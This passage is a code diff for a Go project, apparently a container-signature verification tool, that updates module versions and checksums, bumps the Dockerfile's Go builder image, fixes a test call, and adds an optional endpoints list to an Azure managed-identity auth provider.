v0.0.2 // indirect\n \tgithub.com/vbatts/tar-split v0.11.5 // indirect\n-\tgithub.com/veraison/go-cose v1.2.1 // indirect\n+\tgithub.com/veraison/go-cose v1.3.0 // indirect\n \tgithub.com/x448/float16 v0.8.4 // indirect\n \tgithub.com/xeipuuv/gojsonpointer v0.0.0-20190905194746-02993c407bfb // indirect\n \tgithub.com/xeipuuv/gojsonreference v0.0.0-20180127040603-bd5ef7bd5415 // indirect\n\n@@ -234,14 +234,14 @@\nrequire (\n \tgo.uber.org/atomic v1.11.0 // indirect\n \tgo.uber.org/multierr v1.11.0 // indirect\n \tgo.uber.org/zap v1.27.0 // indirect\n-\tgolang.org/x/crypto v0.26.0\n+\tgolang.org/x/crypto v0.32.0\n \tgolang.org/x/exp v0.0.0-20240112132812-db7319d0e0e3 // indirect\n-\tgolang.org/x/mod v0.20.0 // indirect\n-\tgolang.org/x/net v0.28.0 // indirect\n+\tgolang.org/x/mod v0.22.0 // indirect\n+\tgolang.org/x/net v0.33.0 // indirect\n \tgolang.org/x/oauth2 v0.22.0 // indirect\n-\tgolang.org/x/sys v0.23.0 // indirect\n-\tgolang.org/x/term v0.23.0 // indirect\n-\tgolang.org/x/text v0.17.0 // indirect\n+\tgolang.org/x/sys v0.29.0 // indirect\n+\tgolang.org/x/term v0.28.0 // indirect\n+\tgolang.org/x/text v0.21.0 // indirect\n \tgolang.org/x/time v0.6.0 // indirect\n \tgomodules.xyz/jsonpatch/v2 v2.3.0 // indirect\n \tgopkg.in/inf.v0 v0.9.1 // indirect\n```\n\nFilename: go.sum:\n```\n@@ -275,8 +275,8 @@\ngithub.com/fsnotify/fsnotify v1.7.0 h1:8JEhPFa5W2WU7YfeZzPNqzMP6Lwt7L2715Ggo0nos\n github.com/fsnotify/fsnotify v1.7.0/go.mod h1:40Bi/Hjc2AVfZrqy+aj+yEI+/bRxZnMJyTJwOpGvigM=\n github.com/fxamacker/cbor/v2 v2.7.0 h1:iM5WgngdRBanHcxugY4JySA0nk1wZorNOpTgCMedv5E=\n github.com/fxamacker/cbor/v2 v2.7.0/go.mod h1:pxXPTn3joSm21Gbwsv0w9OSA2y1HFR9qXEeXQVeNoDQ=\n-github.com/go-asn1-ber/asn1-ber v1.5.5 h1:MNHlNMBDgEKD4TcKr36vQN68BA00aDfjIt3/bD50WnA=\n-github.com/go-asn1-ber/asn1-ber v1.5.5/go.mod h1:hEBeB/ic+5LoWskz+yKT7vGhhPYkProFKoKdwZRWMe0=\n+github.com/go-asn1-ber/asn1-ber v1.5.7 h1:DTX+lbVTWaTw1hQ+PbZPlnDZPEIs0SS/GCZAl535dDk=\n+github.com/go-asn1-ber/asn1-ber v1.5.7/go.mod h1:hEBeB/ic+5LoWskz+yKT7vGhhPYkProFKoKdwZRWMe0=\n github.com/go-chi/chi v4.1.2+incompatible h1:fGFk2Gmi/YKXk0OmGfBh0WgmN3XB8lVnEyNz34tQRec=\n github.com/go-chi/chi v4.1.2+incompatible/go.mod h1:eB3wogJHnLi3x/kFX2A+IbTBlXxmMeXJVKy9tTv1XzQ=\n github.com/go-ini/ini v1.67.0 h1:z6ZrTEZqSWOTyH2FlglNbNgARyHG8oLW9gMELqKr06A=\n\n@@ -285,8 +285,8 @@\ngithub.com/go-jose/go-jose/v3 v3.0.3 h1:fFKWeig/irsp7XD2zBxvnmA/XaRWp5V3CBsZXJF7\n github.com/go-jose/go-jose/v3 v3.0.3/go.mod h1:5b+7YgP7ZICgJDBdfjZaIt+H/9L9T/YQrVfLAMboGkQ=\n github.com/go-jose/go-jose/v4 v4.0.2 h1:R3l3kkBds16bO7ZFAEEcofK0MkrAJt3jlJznWZG0nvk=\n github.com/go-jose/go-jose/v4 v4.0.2/go.mod h1:WVf9LFMHh/QVrmqrOfqun0C45tMe3RoiKJMPvgWwLfY=\n-github.com/go-ldap/ldap/v3 v3.4.8 h1:loKJyspcRezt2Q3ZRMq2p/0v8iOurlmeXDPw6fikSvQ=\n-github.com/go-ldap/ldap/v3 v3.4.8/go.mod h1:qS3Sjlu76eHfHGpUdWkAXQTw4beih+cHsco2jXlIXrk=\n+github.com/go-ldap/ldap/v3 v3.4.10 h1:ot/iwPOhfpNVgB1o+AVXljizWZ9JTp7YF5oeyONmcJU=\n+github.com/go-ldap/ldap/v3 v3.4.10/go.mod h1:JXh4Uxgi40P6E9rdsYqpUtbW46D9UTjJ9QSwGRznplY=\n github.com/go-logr/logr v1.2.2/go.mod h1:jdQByPbusPIv2/zmleS9BjJVeZ6kBagPoEUsqbVz/1A=\n github.com/go-logr/logr v1.4.2 h1:6pFjapn8bFcIbiKo3XT4j/BhANplGihG6tvd+8rYgrY=\n github.com/go-logr/logr v1.4.2/go.mod h1:9T104GzyrTigFIr8wt5mBrctHMim0Nb2HLGrmQ40KvY=\n\n@@ -331,8 +331,9 @@\ngithub.com/gogo/protobuf v1.3.2 h1:Ov1cvc58UF3b5XjBnZv7+opcTcQFZebYjWzi34vdm4Q=\n github.com/gogo/protobuf v1.3.2/go.mod h1:P1XiOD3dCwIKUDQYPy72D8LYyHL2YPYrpS2s69NZV8Q=\n github.com/golang-jwt/jwt/v4 v4.0.0/go.mod h1:/xlHOz8bRuivTWchD4jCa+NbatV+wEUSzwAxVc6locg=\n github.com/golang-jwt/jwt/v4 v4.2.0/go.mod h1:/xlHOz8bRuivTWchD4jCa+NbatV+wEUSzwAxVc6locg=\n-github.com/golang-jwt/jwt/v4 v4.5.0 h1:7cYmW1XlMY7h7ii7UhUyChSgS5wUJEnm9uZVTGqOWzg=\n github.com/golang-jwt/jwt/v4 v4.5.0/go.mod h1:m21LjoU+eqJr34lmDMbreY2eSTRJ1cv77w39/MY0Ch0=\n+github.com/golang-jwt/jwt/v4 v4.5.1 h1:JdqV9zKUdtaa9gdPlywC3aeoEsR681PlKC+4F5gQgeo=\n+github.com/golang-jwt/jwt/v4 v4.5.1/go.mod h1:m21LjoU+eqJr34lmDMbreY2eSTRJ1cv77w39/MY0Ch0=\n github.com/golang-jwt/jwt/v5 v5.2.1 h1:OuVbFODueb089Lh128TAcimifWaLhJwVflnrgM17wHk=\n github.com/golang-jwt/jwt/v5 v5.2.1/go.mod h1:pqrtFR0X4osieyHYxtmOUWsAWrfe1Q5UVIyoH402zdk=\n github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=\n\n@@ -516,14 +517,14 @@\ngithub.com/mozillazg/docker-credential-acr-helper v0.3.0/go.mod h1:cZlu3tof523uj\n github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822 h1:C3w9PqII01/Oq1c1nUAm88MOHcQC9l5mIlSMApZMrHA=\n github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822/go.mod h1:+n7T8mK8HuQTcFwEeznm/DIxMOiR9yIdICNftLE1DvQ=\n github.com/niemeyer/pretty v0.0.0-20200227124842-a10e7caefd8e/go.mod h1:zD1mROLANZcx1PVRCS0qkT7pwLkGfwJo4zjcN/Tysno=\n-github.com/notaryproject/notation-core-go v1.1.0 h1:xCybcONOKcCyPNihJUSa+jRNsyQFNkrk0eJVVs1kWeg=\n-github.com/notaryproject/notation-core-go v1.1.0/go.mod h1:+6AOh41JPrnVLbW/19SJqdhVHwKgIINBO/np0e7nXJA=\n-github.com/notaryproject/notation-go v1.2.1 h1:fbCMBcvg1xttrisd5CyM60QDectGYYF701Us0M3cKN8=\n-github.com/notaryproject/notation-go v1.2.1/go.mod h1:re9V+TfuNRaUq5e3NuNcCJN53++sL2KbnJrjGyOUpgE=\n+github.com/notaryproject/notation-core-go v1.2.0 h1:WElMG9X0YXJhBd0A4VOxLNalTLrTjvqtIAj7JHr5X08=\n+github.com/notaryproject/notation-core-go v1.2.0/go.mod h1:+y3L1dOs2/ZwJIU5Imo7BBvZ/M3CFjXkydGGdK09EtA=\n+github.com/notaryproject/notation-go v1.3.0 h1:jn/hAVG5FyKHqTjcU+PCpVnyI4pwINrSk657Hx58j2Y=\n+github.com/notaryproject/notation-go v1.3.0/go.mod h1:ig6lhOPvLW4jrp6ZfaW+B3uNGKbcNW9pgIByvz/s31w=\n github.com/notaryproject/notation-plugin-framework-go v1.0.0 h1:6Qzr7DGXoCgXEQN+1gTZWuJAZvxh3p8Lryjn5FaLzi4=\n github.com/notaryproject/notation-plugin-framework-go v1.0.0/go.mod h1:RqWSrTOtEASCrGOEffq0n8pSg2KOgKYiWqFWczRSics=\n-github.com/notaryproject/tspclient-go v0.2.0 h1:g/KpQGmyk/h7j60irIRG1mfWnibNOzJ8WhLqAzuiQAQ=\n-github.com/notaryproject/tspclient-go v0.2.0/go.mod h1:LGyA/6Kwd2FlM0uk8Vc5il3j0CddbWSHBj/4kxQDbjs=\n+github.com/notaryproject/tspclient-go v1.0.0 h1:AwQ4x0gX8IHnyiZB1tggpn5NFqHpTEm1SDX8YNv4Dg4=\n+github.com/notaryproject/tspclient-go v1.0.0/go.mod h1:LGyA/6Kwd2FlM0uk8Vc5il3j0CddbWSHBj/4kxQDbjs=\n github.com/nozzle/throttler v0.0.0-20180817012639-2ea982251481 h1:Up6+btDp321ZG5/zdSLo48H9Iaq0UQGthrhWC6pCxzE=\n github.com/nozzle/throttler v0.0.0-20180817012639-2ea982251481/go.mod h1:yKZQO8QE2bHlgozqWDiRVqTFlLQSj30K/6SAK8EeYFw=\n github.com/nxadm/tail v1.4.4/go.mod h1:kenIhsEOeOJmVchQTgglprH7qJGnHDVpk1VPCcaMI8A=\n\n@@ -690,8 +691,8 @@\ngithub.com/transparency-dev/merkle v0.0.2 h1:Q9nBoQcZcgPamMkGn7ghV8XiTZ/kRxn1yCG\n github.com/transparency-dev/merkle v0.0.2/go.mod h1:pqSy+OXefQ1EDUVmAJ8MUhHB9TXGuzVAT58PqBoHz1A=\n github.com/vbatts/tar-split v0.11.5 h1:3bHCTIheBm1qFTcgh9oPu+nNBtX+XJIupG/vacinCts=\n github.com/vbatts/tar-split v0.11.5/go.mod h1:yZbwRsSeGjusneWgA781EKej9HF8vme8okylkAeNKLk=\n-github.com/veraison/go-cose v1.2.1 h1:Gj4x20D0YP79J2+cK3anjGEMwIkg2xX+TKVVGUXwNAc=\n-github.com/veraison/go-cose v1.2.1/go.mod h1:t6V8WJzHm1PD5HNsuDjW3KLv577uWb6UTzbZGvdQHD8=\n+github.com/veraison/go-cose v1.3.0 h1:2/H5w8kdSpQJyVtIhx8gmwPJ2uSz1PkyWFx0idbd7rk=\n+github.com/veraison/go-cose v1.3.0/go.mod h1:df09OV91aHoQWLmy1KsDdYiagtXgyAwAl8vFeFn1gMc=\n github.com/vmihailenco/msgpack/v4 v4.3.12/go.mod h1:gborTTJjAo/GWTqqRjrLCn9pgNN+NXzzngzBKDPIqw4=\n github.com/vmihailenco/tagparser v0.1.1/go.mod h1:OeAg3pn3UbLjkWt+rN9oFYB6u/cQgqMEUPoW2WPyhdI=\n github.com/x448/float16 v0.8.4 h1:qLwI1I70+NjRFUR3zs1JPUCgaCXSh3SW62uAKT1mSBM=\n\n@@ -777,11 +778,13 @@\ngolang.org/x/crypto v0.3.1-0.20221117191849-2c476679df9a/go.mod h1:hebNnKkNXi2Uz\n golang.org/x/crypto v0.6.0/go.mod h1:OFC/31mSvZgRz0V1QTNCzfAI1aIRzbiufJtkMIlEp58=\n golang.org/x/crypto v0.7.0/go.mod h1:pYwdfH91IfpZVANVyUOhSIPZaFoJGxTFbZhFTx+dXZU=\n golang.org/x/crypto v0.10.0/go.mod h1:o4eNf7Ede1fv+hwOwZsTHl9EsPFO6q6ZvYR8vYfY45I=\n+golang.org/x/crypto v0.13.0/go.mod h1:y6Z2r+Rw4iayiXXAIxJIDAJ1zMW4yaTpebo8fPOliYc=\n golang.org/x/crypto v0.17.0/go.mod h1:gCAAfMLgwOJRpTjQ2zCCt2OcSfYMTeZVSRtQlPC7Nq4=\n golang.org/x/crypto v0.19.0/go.mod h1:Iy9bg/ha4yyC70EfRS8jz+B6ybOBKMaSxLj6P6oBDfU=\n-golang.org/x/crypto v0.21.0/go.mod h1:0BP7YvVV9gBbVKyeTG0Gyn+gZm94bibOW5BjDEYAOMs=\n-golang.org/x/crypto v0.26.0 h1:RrRspgV4mU+YwB4FYnuBoKsUapNIL5cohGAmSH3azsw=\n-golang.org/x/crypto v0.26.0/go.mod h1:GY7jblb9wI+FOo5y8/S2oY4zWP07AkOJ4+jxCqdqn54=\n+golang.org/x/crypto v0.23.0/go.mod h1:CKFgDieR+mRhux2Lsu27y0fO304Db0wZe70UKqHu0v8=\n+golang.org/x/crypto v0.31.0/go.mod h1:kDsLvtWBEx7MV9tJOj9bnXsPbxwJQ6csT/x4KIN4Ssk=\n+golang.org/x/crypto v0.32.0 h1:euUpcYgM8WcP71gNpTqQCn6rC2t6ULUPiOzfWaXVVfc=\n+golang.org/x/crypto v0.32.0/go.mod h1:ZnnJkOaASj8g0AjIduWNlq2NRxL0PlBrbKVyZ6V/Ugc=\n golang.org/x/exp v0.0.0-20190121172915-509febef88a4/go.mod h1:CJ0aWSM057203Lf6IL+f9T1iT9GByDxfZKAQTCR3kQA=\n golang.org/x/exp v0.0.0-20240112132812-db7319d0e0e3 h1:hNQpMuAJe5CtcUqCXaWga3FHu+kQvCqcsoVaQgSV60o=\n golang.org/x/exp v0.0.0-20240112132812-db7319d0e0e3/go.mod h1:idGWGoKP1toJGkd5/ig9ZLuPcZBC3ewk7SzmH0uou08=\n\n@@ -792,8 +795,11 @@\ngolang.org/x/mod v0.2.0/go.mod h1:s0Qsj1ACt9ePp/hMypM3fl4fZqREWJwdYDEqhRiZZUA=\n golang.org/x/mod v0.3.0/go.mod h1:s0Qsj1ACt9ePp/hMypM3fl4fZqREWJwdYDEqhRiZZUA=\n golang.org/x/mod v0.6.0-dev.0.20220419223038-86c51ed26bb4/go.mod h1:jJ57K6gSWd91VN4djpZkiMVwK6gcyfeH4XE8wZrZaV4=\n golang.org/x/mod v0.8.0/go.mod h1:iBbtSCu2XBx23ZKBPSOrRkjjQPZFPuis4dIYUhu/chs=\n-golang.org/x/mod v0.20.0 h1:utOm6MM3R3dnawAiJgn0y+xvuYRsm1RKM/4giyfDgV0=\n-golang.org/x/mod v0.20.0/go.mod h1:hTbmBsO62+eylJbnUtE2MGJUyE7QWk4xUqPFrRgJ+7c=\n+golang.org/x/mod v0.12.0/go.mod h1:iBbtSCu2XBx23ZKBPSOrRkjjQPZFPuis4dIYUhu/chs=\n+golang.org/x/mod v0.15.0/go.mod h1:hTbmBsO62+eylJbnUtE2MGJUyE7QWk4xUqPFrRgJ+7c=\n+golang.org/x/mod v0.17.0/go.mod h1:hTbmBsO62+eylJbnUtE2MGJUyE7QWk4xUqPFrRgJ+7c=\n+golang.org/x/mod v0.22.0 h1:D4nJWe9zXqHOmWqj4VMOJhvzj7bEZg4wEYa759z1pH4=\n+golang.org/x/mod v0.22.0/go.mod h1:6SkKJ3Xj0I0BrPOZoBy3bdMptDDU9oJrpohJ3eWZ1fY=\n golang.org/x/net v0.0.0-20180724234803-3673e40ba225/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n golang.org/x/net v0.0.0-20180826012351-8a410e7b638d/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n golang.org/x/net v0.0.0-20180906233101-161cd47e91fd/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n\n@@ -821,10 +827,11 @@\ngolang.org/x/net v0.7.0/go.mod h1:2Tu9+aMcznHK/AK1HMvgo6xiTLG5rD5rZLDS+rp2Bjs=\n golang.org/x/net v0.8.0/go.mod h1:QVkue5JL9kW//ek3r6jTKnTFis1tRmNAW2P1shuFdJc=\n golang.org/x/net v0.10.0/go.mod h1:0qNGK6F8kojg2nk9dLZ2mShWaEBan6FAoqfSigmmuDg=\n golang.org/x/net v0.11.0/go.mod h1:2L/ixqYpgIVXmeoSA/4Lu7BzTG4KIyPIryS4IsOd1oQ=\n+golang.org/x/net v0.15.0/go.mod h1:idbUs1IY1+zTqbi8yxTbhexhEEk5ur9LInksu6HrEpk=\n golang.org/x/net v0.21.0/go.mod h1:bIjVDfnllIU7BJ2DNgfnXvpSvtn8VRwhlsaeUTyUS44=\n-golang.org/x/net v0.22.0/go.mod h1:JKghWKKOSdJwpW2GEx0Ja7fmaKnMsbu+MWVZTokSYmg=\n-golang.org/x/net v0.28.0 h1:a9JDOJc5GMUJ0+UDqmLT86WiEy7iWyIhz8gz8E4e5hE=\n-golang.org/x/net v0.28.0/go.mod h1:yqtgsTWOOnlGLG9GFRrK3++bGOUEkNBoHZc8MEDWPNg=\n+golang.org/x/net v0.25.0/go.mod h1:JkAGAh7GEvH74S6FOH42FLoXpXbE/aqXSrIQjXgsiwM=\n+golang.org/x/net v0.33.0 h1:74SYHlV8BIgHIFC/LrYkOGIwL19eTYXQ5wc6TBuO36I=\n+golang.org/x/net v0.33.0/go.mod h1:HXLR5J+9DxmrqMwG9qjGCxZ+zKXxBru04zlTvWlWuN4=\n golang.org/x/oauth2 v0.0.0-20180821212333-d2e6202438be/go.mod h1:N/0e6XlmueqKjAGxoOufVs8QHGRruUQn6yWY3a++T0U=\n golang.org/x/oauth2 v0.22.0 h1:BzDx2FehcG7jJwgWLELCdmLuxk2i+x9UDpSiss2u0ZA=\n golang.org/x/oauth2 v0.22.0/go.mod h1:XYTD2NtWslqkgxebSiOHnXEap4TF09sJSc7H1sXbhtI=\n\n@@ -836,8 +843,11 @@\ngolang.org/x/sync v0.0.0-20200317015054-43a5402ce75a/go.mod h1:RxMgew5VJxzue5/jJ\n golang.org/x/sync v0.0.0-20201020160332-67f06af15bc9/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20220722155255-886fb9371eb4/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.1.0/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n-golang.org/x/sync v0.8.0 h1:3NFvSEYkUoMifnESzZl15y791HH1qU2xm6eCJU5ZPXQ=\n-golang.org/x/sync v0.8.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=\n+golang.org/x/sync v0.3.0/go.mod h1:FU7BRWz2tNW+3quACPkgCx/L+uEAv1htQ0V83Z9Rj+Y=\n+golang.org/x/sync v0.6.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=\n+golang.org/x/sync v0.7.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=\n+golang.org/x/sync v0.10.0 h1:3NQrjDixjgGwUOCaF8w2+VYHv0Ve/vGYSbdkTa98gmQ=\n+golang.org/x/sync v0.10.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=\n golang.org/x/sys v0.0.0-20180830151530-49385e6e1522/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=\n golang.org/x/sys v0.0.0-20180909124046-d0be0721c37e/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=\n golang.org/x/sys v0.0.0-20190215142949-d0b11bdaac8a/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=\n\n@@ -868,23 +878,28 @@\ngolang.org/x/sys v0.5.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.6.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.8.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.9.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n+golang.org/x/sys v0.12.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.15.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n golang.org/x/sys v0.17.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n-golang.org/x/sys v0.18.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n-golang.org/x/sys v0.23.0 h1:YfKFowiIMvtgl1UERQoTPPToxltDeZfbj4H7dVUCwmM=\n-golang.org/x/sys v0.23.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n+golang.org/x/sys v0.20.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n+golang.org/x/sys v0.28.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n+golang.org/x/sys v0.29.0 h1:TPYlXGxvx1MGTn2GiZDhnjPA9wZzZeGKHHmKhHYvgaU=\n+golang.org/x/sys v0.29.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n+golang.org/x/telemetry v0.0.0-20240228155512-f48c80bd79b2/go.mod h1:TeRTkGYfJXctD9OcfyVLyj2J3IxLnKwHJR8f4D8a3YE=\n golang.org/x/term v0.0.0-20201126162022-7de9c90e9dd1/go.mod h1:bj7SfCRtBDWHUb9snDiAeCFNEtKQo2Wmx5Cou7ajbmo=\n golang.org/x/term v0.0.0-20210927222741-03fcf44c2211/go.mod h1:jbD1KX2456YbFQfuXm/mYQcufACuNUgVhRMnK/tPxf8=\n golang.org/x/term v0.2.0/go.mod h1:TVmDHMZPmdnySmBfhjOoOdhjzdE1h4u1VwSiw2l1Nuc=\n golang.org/x/term v0.5.0/go.mod h1:jMB1sMXY+tzblOD4FWmEbocvup2/aLOaQEp7JmGp78k=\n golang.org/x/term v0.6.0/go.mod h1:m6U89DPEgQRMq3DNkDClhWw02AUbt2daBVO4cn4Hv9U=\n golang.org/x/term v0.8.0/go.mod h1:xPskH00ivmX89bAKVGSKKtLOWNx2+17Eiy94tnKShWo=\n golang.org/x/term v0.9.0/go.mod h1:M6DEAAIenWoTxdKrOltXcmDY3rSplQUkrvaDU5FcQyo=\n+golang.org/x/term v0.12.0/go.mod h1:owVbMEjm3cBLCHdkQu9b1opXd4ETQWc3BhuQGKgXgvU=\n golang.org/x/term v0.15.0/go.mod h1:BDl952bC7+uMoWR75FIrCDx79TPU9oHkTZ9yRbYOrX0=\n golang.org/x/term v0.17.0/go.mod h1:lLRBjIVuehSbZlaOtGMbcMncT+aqLLLmKrsjNrUguwk=\n-golang.org/x/term v0.18.0/go.mod h1:ILwASektA3OnRv7amZ1xhE/KTR+u50pbXfZ03+6Nx58=\n-golang.org/x/term v0.23.0 h1:F6D4vR+EHoL9/sWAWgAR1H2DcHr4PareCbAaCo1RpuU=\n-golang.org/x/term v0.23.0/go.mod h1:DgV24QBUrK6jhZXl+20l6UWznPlwAHm1Q1mGHtydmSk=\n+golang.org/x/term v0.20.0/go.mod h1:8UkIAJTvZgivsXaD6/pH6U9ecQzZ45awqEOzuCvwpFY=\n+golang.org/x/term v0.27.0/go.mod h1:iMsnZpn0cago0GOrHO2+Y7u7JPn5AylBrcoWkElMTSM=\n+golang.org/x/term v0.28.0 h1:/Ts8HFuMR2E6IP/jlo7QVLZHggjKQbhu/7H0LJFr3Gg=\n+golang.org/x/term v0.28.0/go.mod h1:Sw/lC2IAUZ92udQNf3WodGtn4k/XoLyZoh8v/8uiwek=\n golang.org/x/text v0.3.0/go.mod h1:NqM8EUOU14njkJ3fqMW+pc6Ldnwhi/IjpwHt7yyuwOQ=\n golang.org/x/text v0.3.2/go.mod h1:bEr9sfX3Q8Zfm5fL9x+3itogRgK3+ptLWKqgva+5dAk=\n golang.org/x/text v0.3.3/go.mod h1:5Zoc/QRtKVWzQhOtBMvqHzDpF6irO9z98xDceosuGiQ=\n\n@@ -896,9 +911,11 @@\ngolang.org/x/text v0.7.0/go.mod h1:mrYo+phRRbMaCq/xk9113O4dZlRixOauAjOtrjsXDZ8=\n golang.org/x/text v0.8.0/go.mod h1:e1OnstbJyHTd6l/uOt8jFFHp6TRDWZR/bV3emEE/zU8=\n golang.org/x/text v0.9.0/go.mod h1:e1OnstbJyHTd6l/uOt8jFFHp6TRDWZR/bV3emEE/zU8=\n golang.org/x/text v0.10.0/go.mod h1:TvPlkZtksWOMsz7fbANvkp4WM8x/WCo/om8BMLbz+aE=\n+golang.org/x/text v0.13.0/go.mod h1:TvPlkZtksWOMsz7fbANvkp4WM8x/WCo/om8BMLbz+aE=\n golang.org/x/text v0.14.0/go.mod h1:18ZOQIKpY8NJVqYksKHtTdi31H5itFRjB5/qKTNYzSU=\n-golang.org/x/text v0.17.0 h1:XtiM5bkSOt+ewxlOE/aE/AKEHibwj/6gvWMl9Rsh0Qc=\n-golang.org/x/text v0.17.0/go.mod h1:BuEKDfySbSR4drPmRPG/7iBdf8hvFMuRexcpahXilzY=\n+golang.org/x/text v0.15.0/go.mod h1:18ZOQIKpY8NJVqYksKHtTdi31H5itFRjB5/qKTNYzSU=\n+golang.org/x/text v0.21.0 h1:zyQAAkrwaneQ066sspRyJaG9VNi/YJ1NfzcGB3hZ/qo=\n+golang.org/x/text v0.21.0/go.mod h1:4IBbMaMmOPCJ8SecivzSH54+73PCFmPWxNTLm+vZkEQ=\n golang.org/x/time v0.6.0 h1:eTDhh4ZXt5Qf0augr54TN6suAUudPcawVZeIAPU7D4U=\n golang.org/x/time v0.6.0/go.mod h1:3BpzKBy/shNhVucY/MWOyx10tF3SFh9QdLuxbVysPQM=\n golang.org/x/tools v0.0.0-20180917221912-90fa682c2a6e/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=\n\n@@ -915,6 +932,7 @@\ngolang.org/x/tools v0.0.0-20210106214847-113979e3529a/go.mod h1:emZCQorbCU4vsT4f\n golang.org/x/tools v0.1.0/go.mod h1:xkSsbof2nBLbhDlRMhhhyNLN/zl3eTqcnHD5viDpcZ0=\n golang.org/x/tools v0.1.12/go.mod h1:hNGJHUnrk76NpqgfD5Aqm5Crs+Hm0VOH/i9J2+nxYbc=\n golang.org/x/tools v0.6.0/go.mod h1:Xwgl3UAJ/d3gWutnCtw505GrjyAbvKui8lOU390QaIU=\n+golang.org/x/tools v0.13.0/go.mod h1:HvlwmtVNQAhOuCjW7xxvovg8wbNq7LwfXh/k7wXUl58=\n golang.org/x/tools v0.21.1-0.20240508182429-e35e4ccd0d2d h1:vU5i/LfpvrRCpgM/VPfJLg5KjxD3E+hfT1SH+d9zLwg=\n golang.org/x/tools v0.21.1-0.20240508182429-e35e4ccd0d2d/go.mod h1:aiJjzUbINMkxbQROHiO6hDPo2LHcIPhhQsa9DLh0yGk=\n golang.org/x/xerrors v0.0.0-20190717185122-a985d3407aa7/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=\n```\n\nFilename: httpserver/Dockerfile:\n```\n@@ -11,7 +11,7 @@\n# See the License for the specific language governing permissions and\n # limitations under the License.\n \n-FROM --platform=$BUILDPLATFORM golang:1.22@sha256:192683db8982323952988c7b86c098ee7ecc6cbeb202bf7c113ff9be5358367c as builder\n+FROM --platform=$BUILDPLATFORM golang:1.23@sha256:8c10f21bec412f08f73aa7b97ca5ac5f28a39d8a88030ad8a339fd0a781d72b4 as builder\n \n ARG TARGETPLATFORM\n ARG TARGETOS\n```\n\nFilename: pkg/certificateprovider/certificate_provider_test.go:\n```\n@@ -78,7 +78,7 @@\nfunc TestDecodeCertificates_ByteArrayToCertificates(t *testing.T) {\n \n \tr, err := DecodeCertificates(c1)\n \tif err != nil {\n-\t\tt.Fatalf(err.Error())\n+\t\tt.Fatal(err.Error())\n \t}\n \n \texpectedLen := 1\n```\n\nFilename: pkg/common/oras/authprovider/azure/azureidentity.go:\n```\n@@ -37,11 +37,13 @@\ntype azureManagedIdentityAuthProvider struct {\n \tidentityToken azcore.AccessToken\n \tclientID      string\n \ttenantID      string\n+\tendpoints     []string\n }\n \n type azureManagedIdentityAuthProviderConf struct {\n-\tName     string `json:\"name\"`\n-\tClientID string `json:\"clientID\"`\n+\tName      string   `json:\"name\"`\n+\tClientID  string   `json:\"clientID\"`\n+\tEndpoints []string `json:\"endpoints,omitempty\"`\n }\n \n const (\n\n@@ -76,9 +78,12 @@\nfunc (s *azureManagedIdentityProviderFactory) Create(authProviderConfig provider\n \t\t\treturn nil, re.ErrorCodeEnvNotSet.WithDetail(\"AZURE_CLIENT_ID environment variable is empty\").WithComponentType(re.AuthProvider)\n \t\t}\n \t}\n+\n+\tendpoints, err := parseEndpoints(conf.Endpoints)\n \tif err != nil {\n-\t\treturn nil, err\n+\t\treturn nil, re.ErrorCodeConfigInvalid.WithError(err)\n \t}\n+\n \t// retrieve an AAD Access token\n \ttoken, err := getManagedIdentityToken(context.Background(), client)\n \tif err != nil {\n\n@@ -89,6 +94,7 @@\nfunc (s *azureManagedIdentityProviderFactory) Create(authProviderConfig provider\n \t\tidentityToken: token,\n \t\tclientID:      client,\n \t\ttenantID:      tenant,\n+\t\tendpoints:     endpoints,\n \t}, nil\n }\n\n@@ -122,6 +128,10 @@\nfunc (d *azureManagedIdentityAuthProvider) Provide(ctx context.Context, 